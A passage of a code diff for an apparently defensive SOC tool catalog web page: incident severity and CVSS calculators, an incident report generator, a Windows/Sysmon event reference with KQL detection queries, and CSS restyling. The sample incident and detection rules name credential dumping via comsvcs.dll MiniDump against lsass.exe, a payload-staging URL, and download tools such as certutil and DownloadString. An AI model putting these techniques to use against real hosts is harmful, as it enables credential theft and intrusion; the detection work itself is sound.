+THREAT_STATUS::active_c2_exfil
+PRIVILEGE_LEVEL::domain_admin`,
+      whatItDoes: "Evaluates five core triage factors—Asset Criticality, Data Sensitivity, Compromise Scope, Threat Status, and Privilege Level—to compute a deterministic 0–100 score and P1–P4 Incident Priority.",
+      whyItMatters: "Subjective severity ratings lead to alert fatigue on minor events or delayed escalation during critical domain-wide intrusions.",
+      howItWorks: "Dynamically weights each parameter in your input block and maps the resulting score to P1 (Critical), P2 (High), P3 (Medium), or P4 (Low) response SLAs.",
+      bestPractices: [
+        "Any confirmed compromise involving Domain Admin privileges or Tier-1 Domain Controllers should immediately escalate to P1.",
+        "Document the severity score breakdown in the initial incident ticket."
+      ],
+      faqs: [
+        { q: "Does changing the values in the input box change the calculated score?", a: "Yes. Try changing tier1_dc to workstation, regulated_pii to public, or domain_admin to standard_user to see the score and priority dynamically recalculate." }
+      ],
+      related: ["report", "cvss", "ioc", "ti"]
     },
     {
       id: "report",
       cat: "util",
-      icon: "file",
-      title: "Incident Report Generator",
-      desc: "Draft standardized executive and technical SOC incident reports in clean, copy-ready Markdown.",
-      tags: ["IR", "Reporting", "SOC", "Documentation"],
-      features: ["Structured Executive Summary, Timeline & MITRE sections", "Automatically defangs all indicators in the final report", "Ready to paste into Jira, ServiceNow or TheHive", "Zero data leaves your browser"],
-      sampleName: "Sample: P1 Credential Dumping Incident",
-      sampleQuery: 'incident="INC-2026-10492" | format="markdown_report"',
+      badge: "RPT",
+      title: "Standardized Incident Report Generator",
+      desc: "Generate structured executive and technical SOC incident reports in clean Markdown with automatically defanged indicators.",
+      tags: ["Incident Response", "Reporting", "Markdown", "SOC"],
+      options: ["Full Executive + Technical Report", "Executive Summary Only"],
+      actionLabel: "Generate Markdown Report",
       sample: `INCIDENT_ID::INC-2026-10492
 TITLE::Unauthorized Credential Dumping & Lateral Movement on SRV-FIN-02
 SEVERITY::P1 - Critical
+DETECTION_SOURCE::Elastic SIEM / Sysmon Event ID 1 & 10
 AFFECTED_ASSETS::SRV-FIN-02 (10.20.4.19), WKSTN-HR-11 (10.20.8.44), Account: corp\\svc_sql
 MITRE_TACTICS::TA0006 Credential Access (T1003.001), TA0008 Lateral Movement (T1021.002)
-TIMELINE::2026-10-17 13:10 UTC - Phishing link executed on WKSTN-HR-11 | 13:18 UTC - LSASS dump detected | 13:31 UTC - Hosts isolated in EDR
-IOCS::185.220.101.42, https://evil-pay-verify.com/stage2.ps1
-CONTAINMENT::Isolated both hosts in EDR, revoked active sessions, rotated svc_sql credentials twice.`
+TIMELINE::
+2026-10-17 13:10 UTC - Phishing link executed on WKSTN-HR-11 spawning encoded PowerShell.
+2026-10-17 13:18 UTC - rundll32.exe comsvcs.dll MiniDump executed against lsass.exe.
+2026-10-17 13:31 UTC - SOC isolated both hosts in EDR and rotated svc_sql credentials.
+IOCS::185.220.101.42, https://evil-pay-verify.com/stage2.ps1, SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+CONTAINMENT::Isolated both endpoints in EDR; revoked Kerberos TGTs; blocked C2 IP at perimeter firewall.`,
+      whatItDoes: "Transforms structured incident notes into a polished, copy-ready Markdown report featuring Executive Summary, Affected Assets, MITRE ATT&CK Mapping, UTC Timeline, Defanged IoCs, and Containment Actions.",
+      whyItMatters: "During shift handoffs and executive briefings, inconsistent ticket notes cause critical containment steps or indicators to be overlooked.",
+      howItWorks: "Parses section keys locally, automatically defangs all URLs and IPs inside the IOCS block, and formats a clean Markdown document.",
+      bestPractices: [
+        "Keep all timeline entries strictly in UTC with explicit source hostnames.",
+        "Separate confirmed containment actions already taken from long-term eradication recommendations."
+      ],
+      faqs: [
+        { q: "Are indicators in the generated report defanged automatically?", a: "Yes. Any URL or IP address placed in the IOCS:: section is automatically defanged in the final Markdown output." }
+      ],
+      related: ["severity", "ioc", "timestamp", "headers"]
     },
     {
       id: "cvss",
       cat: "network",
-      icon: "bug",
-      title: "CVE & CVSS v3.1 Calculator",
-      desc: "Calculate official CVSS v3.1 Base, Temporal and Environmental scores and inspect vector breakdowns.",
-      tags: ["Vulnerability", "CVE", "CVSS", "Threat Intel"],
-      features: ["Implements official FIRST.org CVSS v3.1 math & rounding", "Calculates Base, Temporal, and Impact/Exploitability sub-scores", "Parses any CVSS:3.1/... vector string instantly", "Maps score to Low / Medium / High / Critical severity"],
-      sampleName: "Sample: Critical RCE Vector (Scope Changed)",
-      sampleQuery: 'vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"',
-      sample: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C"
+      badge: "CVS",
+      title: "CVSS v3.1 Base, Temporal & Environmental Calculator",
+      desc: "Calculate official FIRST.org CVSS v3.1 Base, Temporal, and Environmental scores dynamically from vector strings or metric toggles.",
+      tags: ["Vulnerability", "CVSS v3.1", "CVE", "Risk Scoring"],
+      options: ["Full Base + Temporal + Env Breakdown", "Base Score Only"],
+      actionLabel: "Calculate CVSS Score",
+      sample: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:M",
+      whatItDoes: "Computes exact FIRST.org CVSS v3.1 Base, Temporal, and Environmental scores (including Impact and Exploitability sub-scores and official RoundUp logic) from any CVSS v3.1 vector string.",
+      whyItMatters: "A public CVE Base Score of 9.8 may drop significantly in your environment if the asset is air-gapped or protected by compensating controls—or rise to 10.0 if it sits on a critical internet-facing system.",
+      howItWorks: "Parses every metric token (AV, AC, PR, UI, S, C, I, A, E, RL, RC, CR, IR, AR, MAV, etc.) and applies the official CVSS v3.1 mathematical equations in real time.",
+      bestPractices: [
+        "Use Temporal metrics (E:U vs E:H) to prioritize vulnerabilities with active public exploit code or CISA KEV listing.",
+        "Use Environmental requirements (CR, IR, AR) when justifying patch SLA exceptions."
+      ],
+      faqs: [
+        { q: "Does editing the vector string recalculate the score in real time?", a: "Yes. Change any metric in the input box (for example, change AV:N to AV:L or S:C to S:U) and the Base, Temporal, and Environmental scores recalculate immediately." }
+      ],
+      related: ["ti", "severity", "report", "ioc"]
     }
   ];
 
   const EVENT_DB = [
-    { id: "4624", source: "Windows Security", title: "Successful Account Logon", mitre: "T1078 / T1021", fields: "TargetUserName, IpAddress, LogonType (2=Interactive, 3=Network, 10=RDP)", kql: 'event.code: "4624" and winlog.event_data.LogonType: ("3" or "10")' },
-    { id: "4625", source: "Windows Security", title: "Failed Account Logon", mitre: "T1110 (Brute Force)", fields: "TargetUserName, IpAddress, SubStatus (0xC000006A=Bad Password)", kql: 'event.code: "4625" and not winlog.event_data.TargetUserName: *$' },
-    { id: "4688", source: "Windows Security", title: "New Process Created", mitre: "T1059", fields: "NewProcessName, CommandLine, ParentProcessName", kql: 'event.code: "4688" and process.command_line: (*-enc* or *comsvcs*)' },
-    { id: "4697", source: "Windows Security", title: "Service Installed in System", mitre: "T1543.003", fields: "ServiceName, ServiceFileName, SubjectUserName", kql: 'event.code: "4697" and winlog.event_data.ServiceFileName: (*cmd* or *powershell*)' },
-    { id: "4769", source: "Windows Security", title: "Kerberos Service Ticket Requested", mitre: "T1558.003 (Kerberoasting)", fields: "ServiceName, TicketEncryptionType (0x17=RC4)", kql: 'event.code: "4769" and winlog.event_data.TicketEncryptionType: "0x17"' },
-    { id: "1", source: "Sysmon", title: "Process Creation (Sysmon ID 1)", mitre: "T1059", fields: "Image, CommandLine, ParentImage, Hashes", kql: 'event.provider: "Microsoft-Windows-Sysmon" and event.code: "1"' },
-    { id: "3", source: "Sysmon", title: "Network Connection (Sysmon ID 3)", mitre: "T1071", fields: "Image, SourceIp, DestinationIp, DestinationPort", kql: 'event.code: "3" and process.executable: (*rundll32* or *certutil*)' },
-    { id: "10", source: "Sysmon", title: "Process Accessed / LSASS Dump (Sysmon ID 10)", mitre: "T1003.001", fields: "SourceImage, TargetImage (lsass.exe), GrantedAccess", kql: 'event.code: "10" and winlog.event_data.TargetImage: *lsass.exe' },
-    { id: "22", source: "Sysmon", title: "DNS Query Event (Sysmon ID 22)", mitre: "T1071.004", fields: "Image, QueryName, QueryResults", kql: 'event.code: "22" and not process.executable: *chrome.exe' }
+    { id: "4624", source: "Windows Security", title: "An account was successfully logged on", mitre: "T1078 / T1021", fields: "TargetUserName, IpAddress, LogonType (2=Interactive, 3=Network/SMB, 10=RDP), AuthenticationPackageName", kql: 'event.code: "4624" and winlog.event_data.LogonType: ("3" or "10") and not source.ip: "127.0.0.1"', fp: "Exclude machine accounts ending in $ for routine Type 3 domain controller traffic." },
+    { id: "4625", source: "Windows Security", title: "An account failed to log on", mitre: "T1110 (Brute Force)", fields: "TargetUserName, IpAddress, LogonType, SubStatus (0xC000006A=Bad Password, 0xC0000234=Locked)", kql: 'event.code: "4625" and not winlog.event_data.TargetUserName: *$', fp: "Expired service account passwords on scheduled tasks or mapped drives." },
+    { id: "4672", source: "Windows Security", title: "Special privileges assigned to new logon", mitre: "T1078.002", fields: "SubjectUserName, PrivilegeList (SeDebugPrivilege, SeBackupPrivilege)", kql: 'event.code: "4672" and winlog.event_data.PrivilegeList: *SeDebugPrivilege*', fp: "Baseline known Domain Admin accounts; alert on standard user accounts." },
+    { id: "4688", source: "Windows Security", title: "A new process has been created", mitre: "T1059", fields: "NewProcessName, CommandLine, ParentProcessName, SubjectUserName", kql: 'event.code: "4688" and process.command_line: (*-enc* or *DownloadString* or *comsvcs*)', fp: "Requires 'Include command line in process creation events' GPO." },
+    { id: "4697", source: "Windows Security", title: "A service was installed in the system", mitre: "T1543.003", fields: "ServiceName, ServiceFileName, ServiceType, SubjectUserName", kql: 'event.code: "4697" and winlog.event_data.ServiceFileName: (*cmd* or *powershell* or *Temp*)', fp: "Verify against approved software deployment windows." },
+    { id: "4698", source: "Windows Security", title: "A scheduled task was created", mitre: "T1053.005", fields: "TaskName, TaskContent (XML Command/Arguments), SubjectUserName", kql: 'event.code: "4698" and winlog.event_data.TaskContent: (*powershell* or *rundll32* or *http*)', fp: "Exclude known enterprise management agents." },
+    { id: "4720", source: "Windows Security", title: "A user account was created", mitre: "T1136.001", fields: "TargetUserName, SubjectUserName, SamAccountName", kql: 'event.code: "4720"', fp: "Correlate with IAM provisioning tickets." },
+    { id: "4728", source: "Windows Security", title: "A member was added to a privileged global group", mitre: "T1098", fields: "MemberName, TargetUserName (Group Name), SubjectUserName", kql: 'event.code: ("4728" or "4732") and group.name: *Admin*', fp: "Treat unapproved Domain Admin additions as P1 incidents." },
+    { id: "4769", source: "Windows Security", title: "A Kerberos service ticket was requested (Kerberoasting)", mitre: "T1558.003", fields: "ServiceName, TicketEncryptionType (0x17=RC4-HMAC), ClientAddress", kql: 'event.code: "4769" and winlog.event_data.TicketEncryptionType: "0x17" and not winlog.event_data.ServiceName: *$', fp: "Legacy service accounts requiring RC4." },
+    { id: "1102", source: "Windows Security", title: "The audit log was cleared", mitre: "T1070.001", fields: "SubjectUserName, SubjectDomainName", kql: 'event.code: ("1102" or "104")', fp: "High-confidence defense evasion indicator." },
+    { id: "1", source: "Sysmon", title: "Sysmon ID 1 — Process Creation", mitre: "T1059 / T1218", fields: "Image, CommandLine, ParentImage, Hashes (SHA256/IMPHASH), User", kql: 'event.provider: "Microsoft-Windows-Sysmon" and event.code: "1"', fp: "Hunt suspicious parent-child chains (e.g., w3wp.exe or winword.exe spawning cmd/powershell)." },
+    { id: "3", source: "Sysmon", title: "Sysmon ID 3 — Network Connection Detected", mitre: "T1071", fields: "Image, SourceIp, DestinationIp, DestinationPort, DestinationHostname", kql: 'event.code: "3" and process.executable: (*rundll32* or *regsvr32* or *certutil* or *mshta*)', fp: "Scope Sysmon config to non-browser binaries." },
+    { id: "8", source: "Sysmon", title: "Sysmon ID 8 — CreateRemoteThread Detected", mitre: "T1055 (Process Injection)", fields: "SourceImage, TargetImage, StartAddress", kql: 'event.code: "8" and not process.executable: *MsMpEng.exe', fp: "Exclude signed EDR/AV processes." },
+    { id: "10", source: "Sysmon", title: "Sysmon ID 10 — Process Access (LSASS Memory Dump)", mitre: "T1003.001", fields: "SourceImage, TargetImage (lsass.exe), GrantedAccess (0x1010, 0x1410, 0x1F0FFF), CallTrace", kql: 'event.code: "10" and winlog.event_data.TargetImage: *lsass.exe and winlog.event_data.GrantedAccess: ("0x1010" or "0x1410" or "0x1f0fff")', fp: "Alert on dbgcore.dll or comsvcs.dll in CallTrace." },
+    { id: "11", source: "Sysmon", title: "Sysmon ID 11 — FileCreate", mitre: "T1105", fields: "Image, TargetFilename, CreationUtcTime", kql: 'event.code: "11" and file.extension: ("ps1" or "exe" or "dll" or "hta")', fp: "Monitor Temp, Downloads, and Startup folders." },
+    { id: "22", source: "Sysmon", title: "Sysmon ID 22 — DNS Query Event", mitre: "T1071.004", fields: "Image, QueryName, QueryResults", kql: 'event.code: "22" and not process.executable: (*chrome.exe* or *msedge.exe*)', fp: "Great for catching C2 beacons from PowerShell orrundll32." }
   ];
 
+  let currentView = "catalog"; // "catalog" | "tool"
   let activeCat = "all";
   let searchQuery = "";
-  let activeToolId = "regex";
-  let activeTab = "overview";
+  let activeToolId = "ioc";
+  let selectedOptionIdx = 0;
+  const userInputs = {};
 
   function esc(str) {
     return String(str || "")
@@ -258,629 +398,695 @@ CONTAINMENT::Isolated both hosts in EDR, revoked active sessions, rotated svc_sq
     return String(text || "").replace(/https?:\/\//gi, m => m.replace(/t/gi, "x")).replace(/\./g, "[.]");
   }
 
-  function injectDashboardStyles() {
-    /* Neutralize old conflicting tools.css stylesheets so our clean Reference UI renders identically */
+  function injectStyles() {
     document.querySelectorAll('link[href*="tools.css"], link[href*="psv-tools.css"], link[href*="soc-workbench.css"]').forEach(el => {
       el.disabled = true;
     });
 
-    if (document.getElementById("psv-ref-dashboard-css")) return;
+    if (document.getElementById("psv-hiderox-royal-css")) return;
     const style = document.createElement("style");
-    style.id = "psv-ref-dashboard-css";
+    style.id = "psv-hiderox-royal-css";
     style.textContent = `
-      .md-grid { max-width: 1460px !important; width: 96% !important; }
+      .md-grid { max-width: 1380px !important; width: 95% !important; }
       .md-content__inner { margin: 0 !important; padding: 0 !important; max-width: 100% !important; }
       .md-content__inner > h1:first-child { display: none !important; }
       .md-sidebar--primary, .md-sidebar--secondary { display: none !important; }
-      body, .md-main { background: #060b16 !important; }
-      [data-md-color-scheme="default"] body, [data-md-color-scheme="default"] .md-main { background: #f1f5f9 !important; }
+      body, .md-main { background: #050914 !important; }
+      [data-md-color-scheme="default"] body, [data-md-color-scheme="default"] .md-main { background: #f8fafc !important; }
 
-      #psv-dashboard {
+      #psv-app {
         font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        color: #e2e8f0;
-        padding: 1rem 0 3.5rem 0;
+        color: #f1f5f9;
+        padding: 1.5rem 0 4rem 0;
       }
-      [data-md-color-scheme="default"] #psv-dashboard { color: #0f172a; }
+      [data-md-color-scheme="default"] #psv-app { color: #0f172a; }
+      #psv-app svg { max-width: 22px; max-height: 22px; flex-shrink: 0; }
 
-      /* Top Dashboard Header Bar (Matches Reference Image 2) */
-      .psv-top-bar {
-        display: flex;
-        flex-wrap: wrap;
+      /* === VIEW 1: CATALOG HERO (Hiderox Layout + Royal Blue Palette) === */
+      .psv-hero-split {
+        display: grid;
+        grid-template-columns: 1.15fr 0.85fr;
+        gap: 2rem;
         align-items: center;
-        justify-content: space-between;
-        gap: 1.25rem;
-        padding: 1rem 1.35rem;
-        margin-bottom: 1.15rem;
-        border-radius: 12px;
-        background: linear-gradient(180deg, rgba(13, 22, 42, 0.95), rgba(8, 14, 28, 0.95));
-        border: 1px solid rgba(59, 130, 246, 0.22);
-        box-shadow: 0 12px 32px rgba(0, 0, 0, 0.45);
+        margin-bottom: 2.25rem;
       }
-      [data-md-color-scheme="default"] .psv-top-bar {
-        background: #ffffff;
-        border-color: #cbd5e1;
-        box-shadow: 0 4px 16px rgba(15, 23, 42, 0.06);
-      }
-      .psv-brand-group {
-        display: flex;
+      @media (max-width: 960px) { .psv-hero-split { grid-template-columns: 1fr; } }
+
+      .psv-eyebrow {
+        display: inline-flex;
         align-items: center;
-        gap: 1.25rem;
-      }
-      .psv-brand-logo {
-        display: flex;
-        align-items: center;
-        gap: 0.75rem;
-      }
-      .psv-shield-icon {
-        width: 42px;
-        height: 42px;
-        border-radius: 10px;
-        background: rgba(37, 99, 235, 0.16);
-        border: 1px solid rgba(59, 130, 246, 0.4);
-        display: flex;
-        align-items: center;
-        justify-content: center;
+        gap: 0.5rem;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.76rem;
+        font-weight: 700;
+        letter-spacing: 0.14em;
+        text-transform: uppercase;
         color: #3b82f6;
+        margin-bottom: 0.85rem;
       }
-      .psv-shield-icon svg { width: 24px; height: 24px; }
-      .psv-brand-title {
-        font-size: 1.35rem;
+      [data-md-color-scheme="default"] .psv-eyebrow { color: #2563eb; }
+
+      .psv-hero-h1 {
+        font-size: clamp(2.4rem, 4.6vw, 3.75rem);
         font-weight: 800;
-        letter-spacing: 0.02em;
-        line-height: 1.1;
+        line-height: 1.06;
+        letter-spacing: -0.03em;
+        margin: 0 0 1rem 0;
         color: #ffffff;
       }
-      [data-md-color-scheme="default"] .psv-brand-title { color: #0f172a; }
-      .psv-brand-title span { color: #3b82f6; }
-      .psv-brand-domain {
-        font-size: 0.76rem;
-        color: #94a3b8;
-        font-family: "JetBrains Mono", monospace;
-      }
-      .psv-brand-divider {
-        width: 1px;
-        height: 34px;
-        background: rgba(148, 163, 184, 0.2);
-      }
-      .psv-brand-tagline {
-        font-size: 0.88rem;
-        color: #cbd5e1;
-        line-height: 1.35;
-      }
-      [data-md-color-scheme="default"] .psv-brand-tagline { color: #475569; }
+      [data-md-color-scheme="default"] .psv-hero-h1 { color: #0f172a; }
+      .psv-hero-h1 span { color: #3b82f6; }
+      [data-md-color-scheme="default"] .psv-hero-h1 span { color: #2563eb; }
 
-      .psv-search-wrap {
-        flex: 1;
-        max-width: 540px;
-        min-width: 260px;
-        position: relative;
+      .psv-hero-desc {
+        color: #94a3b8;
+        font-size: 1.02rem;
+        line-height: 1.65;
+        max-width: 580px;
+        margin: 0 0 1.4rem 0;
       }
-      .psv-search-input {
-        width: 100%;
-        padding: 0.68rem 1rem 0.68rem 2.4rem;
-        border-radius: 9px;
+      [data-md-color-scheme="default"] .psv-hero-desc { color: #475569; }
+
+      .psv-stats-bar {
+        display: inline-grid;
+        grid-template-columns: repeat(3, auto);
+        border-radius: 10px;
+        border: 1px solid rgba(59, 130, 246, 0.25);
+        background: rgba(11, 20, 38, 0.85);
+        overflow: hidden;
+      }
+      [data-md-color-scheme="default"] .psv-stats-bar {
+        background: #ffffff;
+        border-color: #cbd5e1;
+      }
+      .psv-stat-cell {
+        padding: 0.75rem 1.35rem;
+        border-right: 1px solid rgba(59, 130, 246, 0.18);
+      }
+      .psv-stat-cell:last-child { border-right: none; }
+      .psv-stat-val {
+        font-size: 1.35rem;
+        font-weight: 800;
+        color: #3b82f6;
+        line-height: 1.1;
+      }
+      [data-md-color-scheme="default"] .psv-stat-val { color: #2563eb; }
+      .psv-stat-lbl {
+        font-size: 0.7rem;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        color: #94a3b8;
+        margin-top: 0.2rem;
+      }
+
+      /* Right Hero Mini Preview Grid */
+      .psv-preview-box {
+        border-radius: 12px;
         border: 1px solid rgba(59, 130, 246, 0.28);
-        background: rgba(6, 11, 22, 0.85);
+        background: linear-gradient(180deg, rgba(13, 23, 44, 0.9), rgba(7, 13, 26, 0.95));
+        padding: 1rem;
+        box-shadow: 0 16px 40px rgba(0, 0, 0, 0.45);
+      }
+      [data-md-color-scheme="default"] .psv-preview-box {
+        background: #ffffff;
+        border-color: #cbd5e1;
+        box-shadow: 0 8px 24px rgba(15, 23, 42, 0.06);
+      }
+      .psv-preview-top {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.72rem;
+        color: #60a5fa;
+        margin-bottom: 0.75rem;
+        padding-bottom: 0.5rem;
+        border-bottom: 1px solid rgba(59, 130, 246, 0.18);
+      }
+      .psv-preview-mini-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 0.5rem;
+      }
+      .psv-mini-tile {
+        padding: 0.55rem;
+        border-radius: 7px;
+        border: 1px solid rgba(59, 130, 246, 0.2);
+        background: rgba(6, 11, 22, 0.75);
+        font-size: 0.72rem;
+        font-weight: 600;
+        color: #cbd5e1;
+        cursor: pointer;
+        transition: all 0.15s ease;
+      }
+      [data-md-color-scheme="default"] .psv-mini-tile {
+        background: #f8fafc;
+        color: #1e293b;
+        border-color: #e2e8f0;
+      }
+      .psv-mini-tile:hover {
+        border-color: #3b82f6;
+        color: #3b82f6;
+      }
+      .psv-mini-tile span {
+        display: block;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.65rem;
+        color: #3b82f6;
+        margin-bottom: 0.15rem;
+      }
+
+      /* Main Catalog Container Frame (Hiderox Terminal Window Style in Royal Blue) */
+      .psv-catalog-window {
+        border-radius: 14px;
+        border: 1px solid rgba(59, 130, 246, 0.35);
+        background: #080e1c;
+        overflow: hidden;
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.55);
+      }
+      [data-md-color-scheme="default"] .psv-catalog-window {
+        background: #ffffff;
+        border-color: #cbd5e1;
+        box-shadow: 0 10px 30px rgba(15, 23, 42, 0.06);
+      }
+
+      .psv-window-bar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0.65rem 1.25rem;
+        background: linear-gradient(90deg, #1d4ed8, #2563eb);
+        color: #ffffff;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.76rem;
+        font-weight: 700;
+        letter-spacing: 0.06em;
+      }
+      .psv-window-dots {
+        display: flex;
+        align-items: center;
+        gap: 0.4rem;
+      }
+      .psv-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.7);
+      }
+
+      .psv-catalog-body {
+        padding: 1.5rem;
+      }
+
+      .psv-search-bar {
+        width: 100%;
+        padding: 0.8rem 1.1rem;
+        border-radius: 9px;
+        border: 1px solid rgba(59, 130, 246, 0.3);
+        background: #050914;
         color: #f8fafc;
-        font-size: 0.86rem;
+        font-size: 0.9rem;
+        margin-bottom: 1rem;
         outline: none;
       }
-      [data-md-color-scheme="default"] .psv-search-input {
+      [data-md-color-scheme="default"] .psv-search-bar {
         background: #f8fafc;
         border-color: #cbd5e1;
         color: #0f172a;
       }
-      .psv-search-input:focus {
+      .psv-search-bar:focus {
         border-color: #3b82f6;
         box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25);
       }
-      .psv-search-icon {
-        position: absolute;
-        left: 0.8rem;
-        top: 50%;
-        transform: translateY(-50%);
-        color: #64748b;
-        pointer-events: none;
-      }
 
-      /* Category Pills Row */
-      .psv-cat-row {
+      .psv-cat-pills {
         display: flex;
         flex-wrap: wrap;
-        gap: 0.6rem;
-        margin-bottom: 1.25rem;
-      }
-      .psv-cat-pill {
-        display: inline-flex;
-        align-items: center;
         gap: 0.5rem;
-        padding: 0.52rem 0.95rem;
-        border-radius: 9px;
-        border: 1px solid rgba(59, 130, 246, 0.22);
-        background: rgba(13, 22, 42, 0.85);
-        color: #cbd5e1;
-        font-size: 0.82rem;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.15s ease;
+        margin-bottom: 1.4rem;
       }
-      [data-md-color-scheme="default"] .psv-cat-pill {
-        background: #ffffff;
-        border-color: #cbd5e1;
-        color: #334155;
-      }
-      .psv-cat-pill svg { width: 15px; height: 15px; color: #60a5fa; }
-      .psv-cat-pill:hover { border-color: #3b82f6; color: #ffffff; }
-      [data-md-color-scheme="default"] .psv-cat-pill:hover { color: #0f172a; }
-      .psv-cat-pill.active {
-        background: linear-gradient(135deg, #2563eb, #1d4ed8);
-        border-color: #3b82f6;
-        color: #ffffff !important;
-        box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
-      }
-      .psv-cat-pill.active svg { color: #ffffff; }
-      .psv-cat-count {
-        padding: 0.1rem 0.45rem;
-        border-radius: 6px;
-        background: rgba(255, 255, 255, 0.15);
-        font-size: 0.72rem;
-        font-weight: 700;
-      }
-
-      /* 3-Column Tool Cards Grid */
-      .psv-cards-grid {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 1rem;
-        margin-bottom: 1.5rem;
-      }
-      @media (max-width: 1100px) { .psv-cards-grid { grid-template-columns: repeat(2, 1fr); } }
-      @media (max-width: 700px) { .psv-cards-grid { grid-template-columns: 1fr; } }
-
-      .psv-card {
-        border-radius: 12px;
-        border: 1px solid rgba(59, 130, 246, 0.22);
-        background: linear-gradient(180deg, rgba(13, 23, 44, 0.92), rgba(8, 15, 30, 0.95));
-        padding: 1.15rem 1.25rem;
-        display: flex;
-        flex-direction: column;
-        justify-content: space-between;
-        transition: all 0.18s ease;
-        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.32);
-      }
-      [data-md-color-scheme="default"] .psv-card {
-        background: #ffffff;
-        border-color: #cbd5e1;
-        box-shadow: 0 2px 10px rgba(15, 23, 42, 0.05);
-      }
-      .psv-card:hover, .psv-card.active-card {
-        border-color: #3b82f6;
-        box-shadow: 0 0 0 1px rgba(59, 130, 246, 0.45), 0 10px 28px rgba(29, 78, 216, 0.22);
-      }
-      .psv-card-top {
-        display: flex;
-         gap: 1rem;
-        align-items: flex-start;
-      }
-      .psv-card-icon {
-        width: 48px;
-        height: 48px;
-        flex-shrink: 0;
-        border-radius: 10px;
-        background: rgba(37, 99, 235, 0.12);
-        border: 1px solid rgba(59, 130, 246, 0.32);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: #3b82f6;
-      }
-      .psv-card-icon svg { width: 26px; height: 26px; }
-      .psv-card-title {
-        font-size: 1.08rem;
-        font-weight: 700;
-        color: #ffffff;
-        margin: 0 0 0.3rem 0;
-      }
-      [data-md-color-scheme="default"] .psv-card-title { color: #0f172a; }
-      .psv-card-desc {
-        font-size: 0.81rem;
-        color: #94a3b8;
-        line-height: 1.45;
-        margin: 0 0 0.75rem 0;
-      }
-      [data-md-color-scheme="default"] .psv-card-desc { color: #475569; }
-      .psv-tag-row {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 0.35rem;
-        margin-bottom: 1rem;
-      }
-      .psv-tag {
-        padding: 0.18rem 0.55rem;
-        border-radius: 5px;
-        background: rgba(30, 41, 59, 0.85);
-        border: 1px solid rgba(148, 163, 184, 0.2);
-        color: #cbd5e1;
-        font-size: 0.71rem;
-        font-weight: 600;
-      }
-      [data-md-color-scheme="default"] .psv-tag {
-        background: #f1f5f9;
-        border-color: #cbd5e1;
-        color: #334155;
-      }
-      .psv-card-footer {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        gap: 0.75rem;
-        padding-top: 0.75rem;
-        border-top: 1px solid rgba(148, 163, 184, 0.12);
-      }
-      .psv-open-btn {
-        padding: 0.48rem 1.05rem;
-        border-radius: 7px;
-        background: linear-gradient(135deg, #2563eb, #1d4ed8);
-        color: #ffffff !important;
-        font-size: 0.8rem;
-        font-weight: 700;
-        border: none;
-        cursor: pointer;
-        white-space: nowrap;
-        box-shadow: 0 3px 10px rgba(37, 99, 235, 0.35);
-      }
-      .psv-open-btn:hover { background: #1e40af; }
-      .psv-privacy-note {
-        display: flex;
-        align-items: center;
-        gap: 0.45rem;
-        font-size: 0.71rem;
-        color: #94a3b8;
-        line-height: 1.25;
-      }
-      .psv-privacy-note svg { width: 15px; height: 15px; flex-shrink: 0; }
-      .psv-privacy-note strong { color: #cbd5e1; display: block; }
-      [data-md-color-scheme="default"] .psv-privacy-note strong { color: #334155; }
-
-      /* Bottom Split-Pane Interactive Workbench (Exact Reference Image 2 Lower Section) */
-      .psv-workbench-shell {
-        display: grid;
-        grid-template-columns: 250px 1fr;
-        gap: 1rem;
-        border-radius: 12px;
-        border: 1px solid rgba(59, 130, 246, 0.28);
-        background: linear-gradient(180deg, rgba(10, 18, 36, 0.96), rgba(6, 11, 22, 0.98));
-        padding: 1rem;
-        box-shadow: 0 14px 38px rgba(0, 0, 0, 0.5);
-      }
-      [data-md-color-scheme="default"] .psv-workbench-shell {
-        background: #ffffff;
-        border-color: #cbd5e1;
-        box-shadow: 0 6px 20px rgba(15, 23, 42, 0.06);
-      }
-      @media (max-width: 960px) { .psv-workbench-shell { grid-template-columns: 1fr; } }
-
-      .psv-side-nav {
-        border-right: 1px solid rgba(148, 163, 184, 0.14);
-        padding-right: 0.85rem;
-      }
-      @media (max-width: 960px) { .psv-side-nav { border-right: none; padding-right: 0; } }
-      .psv-side-header {
-        font-size: 0.88rem;
-        font-weight: 700;
-        color: #ffffff;
-        padding: 0.35rem 0.5rem 0.75rem 0.5rem;
-        border-bottom: 1px solid rgba(148, 163, 184, 0.14);
-        margin-bottom: 0.6rem;
-      }
-      [data-md-color-scheme="default"] .psv-side-header { color: #0f172a; }
-      .psv-side-list {
-        display: flex;
-        flex-direction: column;
-        gap: 0.3rem;
-      }
-      .psv-side-item {
-        display: flex;
-        align-items: center;
-        gap: 0.6rem;
-        width: 100%;
-        text-align: left;
-        padding: 0.55rem 0.75rem;
-        border-radius: 8px;
-        border: 1px solid transparent;
-        background: transparent;
-        color: #cbd5e1;
-        font-size: 0.81rem;
-        font-weight: 600;
-        cursor: pointer;
-      }
-      [data-md-color-scheme="default"] .psv-side-item { color: #334155; }
-      .psv-side-item svg { width: 16px; height: 16px; color: #3b82f6; flex-shrink: 0; }
